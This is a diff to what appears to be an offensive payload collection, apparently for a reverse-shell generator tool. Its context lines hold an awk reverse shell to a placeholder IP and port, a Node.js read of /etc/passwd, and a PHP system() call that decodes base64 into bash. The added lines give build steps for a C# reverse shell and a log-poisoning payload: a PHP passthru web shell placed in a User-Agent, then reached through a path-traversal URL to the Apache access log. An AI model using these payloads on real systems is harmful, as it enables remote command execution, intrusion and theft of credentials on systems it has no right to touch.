@@ -442,6 +442,7 @@ payload:
 
       require('fs').readFileSync("/etc/passwd").toString('utf8')
 
+      {NODE_BASE64}
   awk:
     - |
       awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
@@ -1255,6 +1256,10 @@ payload:
       }
     - |
       #Linux (Save as shell.cs)
+      # dotnet new console
+      # replace Program.cs Content
+      # dotnet build
+      # dotnet run
 
       using System;
       using System.Text;
@@ -1663,4 +1668,10 @@ payload:
       <?php system("echo '{BASE64_PY3}' | base64 -d | bash"); ?>
 
       {PHP_LFI}
+    - |
+      # Log poisoning
+
+      # User-Agent: <?php passthru($_GET['cmd']); ?> Firefox/91.0
+      # http://localhost/blog.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+
 """
